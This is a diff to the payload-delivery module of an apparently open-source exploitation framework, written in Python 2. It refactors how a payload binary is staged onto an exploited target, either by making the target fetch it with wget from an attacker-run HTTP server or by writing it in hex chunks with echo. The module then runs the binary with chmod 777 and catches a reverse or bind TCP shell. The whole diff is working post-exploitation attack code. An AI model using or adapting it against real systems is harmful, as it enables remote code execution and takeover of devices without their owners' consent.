@@ -91,7 +91,6 @@ def shell(exploit, architecture="", method="", **params):
                             setattr(payload, c[1], c[2])
 
             elif cmd == "run":
-                exec_binary_str = ""
                 data = payload.generate()
 
                 if method == "wget":
@@ -103,12 +102,13 @@ def shell(exploit, architecture="", method="", **params):
                     communication = Communication(exploit, elf_binary, options, **params)
                     communication.echo()
                 elif method == "generic":
-                    exec_binary_str = data
+                    params["exec_binary"] = data
+                    communication = Communication(exploit, elf_binary, options, **params)
 
                 if payload.handler == "bind_tcp":
-                    communication.bind_tcp(exec_binary_str)
+                    communication.bind_tcp()
                 elif payload.handler == "reverse_tcp":
-                    communication.reverse_tcp(exec_binary_str)
+                    communication.reverse_tcp()
 
             elif cmd == "back":
                 payload = None
@@ -140,16 +140,23 @@ class HttpServer(BaseHTTPServer.HTTPServer):
 
 
 class Communication(object):
-    def __init__(self, exploit, payload, options, location, binary="", shell=""):
+    def __init__(self, exploit, payload, options, location, wget_options={}, echo_options={}, exec_binary=None):
         self.exploit = exploit
         self.payload = payload
         self.options = {option[0]: option[1] for option in options}
 
+        # location to save the payload e.g. /tmp/
         self.location = location
-        self.binary_name = random_text(8)
 
-        self.binary = binary
-        self.shell = shell
+        # transfer techniques
+        self.wget_options = wget_options
+        self.echo_options = echo_options
+
+        # process of executing payload
+        self.exec_binary = exec_binary
+
+        # name of the binary - its random 8 bytes
+        self.binary_name = None
 
     def http_server(self, lhost, lport):
         print_status("Setting up HTTP server")
@@ -160,6 +167,12 @@ class Communication(object):
 
     def wget(self):
         print_status("Using wget method")
+        self.binary_name = random_text(8)
+
+        if "binary" in self.wget_options.keys():
+            binary = self.wget_options['binary']
+        else:
+            binary = "wget"
 
         # run http server
         thread = threading.Thread(target=self.http_server, args=(self.options['lhost'], self.options['lport']))
@@ -167,7 +180,7 @@ class Communication(object):
 
         # wget binary
         print_status("Using wget to download binary")
-        cmd = "{} http://{}:{}/{} -O {}/{}".format(self.binary,
+        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                    self.options['lhost'],
                                                    self.options['lport'],
                                                    self.binary_name,
@@ -178,27 +191,41 @@ class Communication(object):
 
     def echo(self):
         print_status("Using echo method")
+        self.binary_name = random_text(8)
 
         path = "{}/{}".format(self.location, self.binary_name)
 
+        # echo stream e.g. echo -ne {} >> {}
+        if "stream" in self.echo_options.keys():
+            echo_stream = self.echo_options['stream']
+        else:
+            echo_stream = 'echo -ne "{}" >> {}'
+
+        # echo prefix e.g. "\\x"
+        if "prefix" in self.echo_options.keys():
+            echo_prefix = self.echo_options['prefix']
+        else:
+            echo_prefix = "\\x"
+
+        # echo max length of the block
+        if "max_length" in self.echo_options.keys():
+            echo_max_length = int(self.echo_options['max_length'])
+        else:
+            echo_max_length = 30
+
         size = len(self.payload)
-        num_parts = (size / 30) + 1
+        num_parts = (size / echo_max_length) + 1
 
         # transfer binary through echo command
         print_status("Using echo method to transfer binary")
         for i in range(0, num_parts):
-            current = i * 30
+            current = i * echo_max_length
             print_status("Transferring {}/{} bytes".format(current, len(self.payload)))
 
-            block = self.payload[current:current + 30].encode('hex')
-            block = "\\x" + "\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
-            cmd = 'echo -ne {} >> {}'.format(block, path)
+            block = self.payload[current:current + echo_max_length].encode('hex')
+            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
+            cmd = echo_stream.format(block, path)
             self.exploit.execute(cmd)
-
-    def build_exec_binary_str(self, location, binary_name):
-        path = "{}/{}".format(location, binary_name)
-        exec_binary_str = "chmod 777 {}; {}; rm {}".format(path, path, path)
-        return exec_binary_str
 
     def listen(self, lhost, lport):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -207,14 +234,34 @@ class Communication(object):
         sock.listen(5)
         return sock
 
-    def reverse_tcp(self, exec_binary_str=""):
+    def build_commands(self):
+        path = "{}/{}".format(self.location, self.binary_name)
+
+        commands = []
+        if isinstance(self.exec_binary, list) or isinstance(self.exec_binary, tuple):
+            for item_exec_binary in self.exec_binary:
+                if isinstance(item_exec_binary, str):
+                    try:
+                        commands.append(item_exec_binary.format(path))
+                    except ValueError:
+                        commands.append(item_exec_binary)
+                elif callable(item_exec_binary):
+                    commands.append(item_exec_binary(path))
+        else:
+            exec_binary_str = "chmod 777 {0}; {0}; rm {0}".format(path)
+            commands.append(exec_binary_str) 
+
+        return commands
+
+    def reverse_tcp(self):
         sock = self.listen(self.options['lhost'], self.options['lport'])
 
-        if not exec_binary_str:
-            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)
+        # execute binary
+        commands = self.build_commands()
 
-        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
-        thread.start()
+        for command in commands:
+            thread = threading.Thread(target=self.exploit.execute, args=(command,))
+            thread.start()
 
         # waiting for shell
         print_status("Waiting for reverse shell...")
@@ -227,19 +274,20 @@ class Communication(object):
         t.sock = client
         t.interact()
 
-    def bind_tcp(self, exec_binary_str=""):
-        if not exec_binary_str:
-            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)
+    def bind_tcp(self):
+        # execute binary
+        commands = self.build_commands()
 
-        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
-        thread.start()
+        for command in commands:
+            thread = threading.Thread(target=self.exploit.execute, args=(command,))
+            thread.start()
 
         # connecting to shell
         print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
         time.sleep(2)
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((self.options['rhost'], self.options['rport']))
+        sock.connect((self.options['rhost'], int(self.options['rport'])))
 
         print_success("Enjoy your shell")
         tn = telnetlib.Telnet()
